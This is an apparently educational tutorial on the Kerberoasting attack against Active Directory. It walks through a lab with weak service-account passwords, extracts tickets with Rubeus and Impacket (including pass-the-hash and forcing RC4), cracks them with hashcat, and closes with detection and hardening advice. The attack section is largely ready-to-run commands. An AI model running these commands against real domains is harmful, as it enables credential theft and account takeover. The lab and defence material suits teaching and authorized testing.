# Kerberoasting Attack — A Practical Guide

> **Difficulty:** Intermediate  
> **Environment:** Active Directory (Windows)  
> **Goal:** Understand what Kerberoasting is, how it works under the hood, and how to reproduce it step by step in a lab.

---

## Table of Contents

1. [What is Kerberoasting?](#what-is-kerberoasting)
2. [How Kerberos Works (Quick Background)](#how-kerberos-works-quick-background)
3. [What Actually Happens During the Attack](#what-actually-happens-during-the-attack)
4. [Prerequisites](#prerequisites)
5. [Lab Setup](#lab-setup)
6. [Step-by-Step Attack Walkthrough](#step-by-step-attack-walkthrough)
7. [Cracking the Hash](#cracking-the-hash)
8. [Detection & Defense](#detection--defense)
9. [References](#references)

---

## What is Kerberoasting?

Kerberoasting is an **offline password cracking attack** against Active Directory service accounts.

The key idea: any authenticated domain user can request a **Kerberos service ticket** for any service registered in AD. That ticket is encrypted with the **service account's NTLM password hash**. Once you grab the ticket, you take it offline and crack it — no interaction with the target machine needed.

If the service account has a weak password, you now own it.

---

## How Kerberos Works (Quick Background)

Kerberos is the default authentication protocol in Active Directory. It involves three players:

| Actor | Role |
|---|---|
| **Client** | The user trying to access a service |
| **KDC (Key Distribution Center)** | Runs on the Domain Controller; issues tickets |
| **Service** | The target resource (e.g., SQL Server, web app) |

The flow looks like this:

```
Client  -->  KDC (AS)  : KRB_AS_REQ  — "I want a TGT"
KDC     -->  Client    : KRB_AS_REP  — TGT (encrypted with user hash)

Client  -->  KDC (TGS) : KRB_TGS_REQ — "I want a ticket for SPN X"
KDC     -->  Client    : KRB_TGS_REP — service ticket  ← Kerberoasting steals this

Client  -->  Server    : KRB_AP_REQ  — presents the service ticket
Server  -->  Client    : KRB_AP_REP  — access granted
```

The service ticket inside `TGS-REP` is encrypted with the **service account's password hash (RC4 or AES)**. Normally the client just hands this ticket to the service — it never needs to decrypt it. But an attacker can pull this ticket out and attempt to crack the encryption offline.

### What is an SPN?

A **Service Principal Name (SPN)** is how Kerberos identifies a service. It looks like this:

```
MSSQLSvc/sqlserver.corp.local:1433
HTTP/webserver.corp.local
```

Any domain account with an SPN registered becomes a valid Kerberoasting target.

---

## What Actually Happens During the Attack

Here is the attack broken down into plain steps:

**Step 1 — Authenticate as any domain user**  
You only need valid credentials for a low-privilege account. Even a helpdesk user works.

**Step 2 — Query LDAP for accounts with SPNs**  
You ask AD: "Give me a list of all accounts that have an SPN set." This is a completely normal, allowed operation. No special permissions needed.

**Step 3 — Request service tickets**  
For each SPN you found, you send a `TGS-REQ` to the Domain Controller. The DC responds with a `TGS-REP` containing the service ticket encrypted with the service account's hash. Again — this is normal Kerberos behavior.

**Step 4 — Extract the tickets**  
You pull the encrypted ticket data from memory or capture it from the TGS-REP response.

**Step 5 — Crack offline**  
You feed the ticket to `hashcat` or `john`. If the service account uses a weak password, you recover it in minutes. No lockout policies apply — cracking happens entirely on your machine.

```
[Domain Controller]                     [Attacker Machine]
      |                                        |
      |<-- TGS-REQ (any SPN) ----------------|
      |                                        |
      |--- TGS-REP (encrypted with svc hash) ->|
      |                                        |
      |                          [extract hash from ticket]
      |                          [run hashcat offline]
      |                          [recover password if weak]
```

**Why is this possible?**  
Because requesting service tickets is a normal, unauthenticated-at-the-application-level operation. The DC doesn't check whether you actually intend to use the service — it just issues the ticket.

---

## Prerequisites

Before running this in a lab, make sure you have:

- [ ] A Windows domain environment (Windows Server 2016/2019/2022 as DC)
- [ ] At least one domain user account (low privilege is fine)
- [ ] A service account with an SPN registered
- [ ] An attacker machine (Windows or Linux)
- [ ] Tools: `Rubeus`, `Impacket`, `hashcat`

---

## Lab Setup

### 1. Build the Domain Controller

Skip this if you already have an AD lab.

```powershell
# On Windows Server — promote to DC
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
Import-Module ADDSDeployment

Install-ADDSForest `
    -DomainName "corp.local" `
    -DomainNetBIOSName "CORP" `
    -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssword123" -AsPlainText -Force) `
    -Force
```

### 2. Create a Vulnerable Service Account

```powershell
# Create a service account with a weak password
New-ADUser `
    -Name "svc_mssql" `
    -SamAccountName "svc_mssql" `
    -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) `
    -Enabled $true `
    -PasswordNeverExpires $true

# Register an SPN — this makes it a Kerberoasting target
setspn -A MSSQLSvc/sqlserver.corp.local:1433 CORP\svc_mssql

# Verify
setspn -L svc_mssql
```

### 3. Create a Low-Privilege User (the attacker's foothold)

```powershell
New-ADUser `
    -Name "jdoe" `
    -SamAccountName "jdoe" `
    -AccountPassword (ConvertTo-SecureString "Welcome1!" -AsPlainText -Force) `
    -Enabled $true
```

---

## Step-by-Step Attack Walkthrough

### Option A — From Windows (using Rubeus)

[Rubeus](https://github.com/GhostPack/Rubeus) is the go-to tool for Kerberos attacks on Windows.

**Step 1: Download / compile Rubeus on your attacker machine**

```powershell
# If you have the binary:
.\Rubeus.exe
```

**Step 2: Enumerate all Kerberoastable accounts**

```powershell
.\Rubeus.exe kerberoast /stats
```

Output will show accounts with SPNs and their encryption type (RC4 is easier to crack than AES).

**Step 3: Request and dump all tickets**

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

This queries LDAP for all SPN accounts, requests TGS tickets, and writes the hashes to `hashes.txt` in hashcat-ready format.

**Step 4: Target a specific account**

```powershell
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:svc_mssql_hash.txt
```

**Step 5: Force RC4 encryption (easier to crack)**

```powershell
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes_rc4.txt
```

---

### Option B — From Linux (using Impacket)

[Impacket](https://github.com/fortra/impacket) by **fortra** is the standard toolkit for AD attacks from Linux. It ships a suite of ready-to-use CLI tools — no need to call Python scripts directly.

**Step 1: Install Impacket**

```bash
# Option 1 — pip (quickest, installs CLI tools into PATH automatically)
pip3 install impacket

# Option 2 — from source (recommended, always latest)
git clone https://github.com/fortra/impacket
cd impacket
pip3 install .

# Option 3 — pipx (isolated, no venv headaches)
pipx install impacket
```

After install, all tools are available as direct commands:

```bash
impacket-getuserspns    # the one we use here
impacket-secretsdump
impacket-psexec
# ... and many more
```

---

**Step 2: Enumerate Kerberoastable accounts (no ticket request yet)**

```bash
impacket-getuserspns corp.local/jdoe:Welcome1! -dc-ip 192.168.1.10
```

Output shows all accounts with SPNs registered — your target list.

---

**Step 3: Request TGS tickets and dump hashes**

```bash
impacket-getuserspns corp.local/jdoe:Welcome1! -dc-ip 192.168.1.10 -request
```

**Breakdown of arguments:**

| Argument | Meaning |
|---|---|
| `corp.local/jdoe:Welcome1!` | Domain, username, password of your low-priv account |
| `-dc-ip 192.168.1.10` | IP address of the Domain Controller |
| `-request` | Actually request TGS tickets (not just list SPNs) |

---

**Step 4: Save hashes directly to a file**

```bash
impacket-getuserspns corp.local/jdoe:Welcome1! -dc-ip 192.168.1.10 -request -outputfile kerberoast_hashes.txt
```

---

**Step 5: Target a single account**

```bash
impacket-getuserspns corp.local/jdoe:Welcome1! -dc-ip 192.168.1.10 -request -usersfile targets.txt
```

Or filter directly:

```bash
impacket-getuserspns corp.local/jdoe:Welcome1! -dc-ip 192.168.1.10 -request | grep svc_mssql
```

---

**Step 6: View what you got**

```bash
cat kerberoast_hashes.txt
```

The hash will look like this:

```
$krb5tgs$23$*svc_mssql$CORP.LOCAL$MSSQLSvc/sqlserver.corp.local:1433*$a3f0...
```

- `$23$` = RC4 encryption (etype 23) — easier to crack
- `$18$` = AES-256 (etype 18) — harder to crack

---

### Option C — From Linux with an NTLM Hash (no cleartext password)

If you have a hash instead of a cleartext password (e.g. from a previous dump), you can still Kerberoast using Pass-the-Hash:

```bash
impacket-getuserspns corp.local/jdoe \
  -hashes :5f4dcc3b5aa765d61d8327deb882cf99 \
  -dc-ip 192.168.1.10 \
  -request \
  -outputfile kerberoast_hashes.txt
```

> The format is `LMhash:NThash`. If you only have the NT hash, put a blank LM hash before the colon: `-hashes :NThashhere`.

---

## Cracking the Hash

Once you have the hash file, crack it offline using `hashcat`.

**Identify the hash mode:**

| Encryption | Hashcat Mode |
|---|---|
| RC4 (etype 23) | `13100` |
| AES-128 (etype 17) | `19600` |
| AES-256 (etype 18) | `19700` |

**Step 1: Dictionary attack (fastest)**

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Step 2: Rule-based attack (covers common mutations)**

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Step 3: Show cracked passwords**

```bash
hashcat -m 13100 kerberoast_hashes.txt --show
```

Expected output:

```
$krb5tgs$23$*svc_mssql$...:Summer2024!
```

You now have the service account's cleartext password.

---

## Detection & Defense

### For Defenders

**1. Use strong, random passwords for service accounts**  
Passwords longer than 25 characters are practically uncrackable with today's hardware, even with RC4. Use Group Managed Service Accounts (gMSA) — they auto-rotate 120-character random passwords.

```powershell
# Create a Group Managed Service Account
New-ADServiceAccount -Name "gmsa_mssql" -DNSHostName "sqlserver.corp.local" -PrincipalsAllowedToRetrieveManagedPassword "Domain Computers"
```

**2. Audit accounts with SPNs**

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select Name, ServicePrincipalName
```

Remove SPNs from accounts that don't need them.

**3. Enable AES encryption and disable RC4**  
RC4 (etype 23) is the attacker's preferred format — it's faster to crack. Enforce AES-only on service accounts.

```powershell
Set-ADUser svc_mssql -KerberosEncryptionType AES128,AES256
```

**4. Monitor for suspicious TGS-REQ volume**  
A user requesting dozens of TGS tickets in a short window is a red flag.

- **Event ID 4769** — A Kerberos Service Ticket was requested  
  Filter for: `Ticket Encryption Type = 0x17` (RC4) and high-frequency requests from a single user.

**5. Use a honeypot SPN**  
Create a fake service account with a simple password and an SPN. Any TGS request for it is an immediate alert.

```powershell
New-ADUser -Name "svc_honeypot" -AccountPassword (ConvertTo-SecureString "Honey123!" -AsPlainText -Force) -Enabled $true
setspn -A HTTP/honeypot.corp.local CORP\svc_honeypot
```

### Detection Summary

| Signal | Event ID | What to look for |
|---|---|---|
| High-volume TGS requests | 4769 | Many requests from one account in short time |
| RC4 ticket requests | 4769 | `Ticket Encryption Type: 0x17` |
| LDAP SPN enumeration | 4662 | LDAP queries for `servicePrincipalName` |
| Rubeus / Impacket activity | — | Network signatures, EDR alerts |

---

## References

- [Original Kerberoasting research — Tim Medin (DerbyCon 2014)](https://www.youtube.com/watch?v=PUyhlN-E5MU)
- [Impacket by fortra](https://github.com/fortra/impacket) — the toolkit behind `impacket-getuserspns` and all other AD attack tools used here
- [Impacket GetUserSPNs source](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
- [GhostPack Rubeus](https://github.com/GhostPack/Rubeus)
- [Harmj0y — Roasting AS-REPs](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
- [Microsoft — Group Managed Service Accounts](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
- [MITRE ATT&CK T1558.003](https://attack.mitre.org/techniques/T1558/003/)

---

> **Legal notice:** This guide is for educational purposes and authorized penetration testing only. Running these attacks against systems you do not own or have explicit written permission to test is illegal.
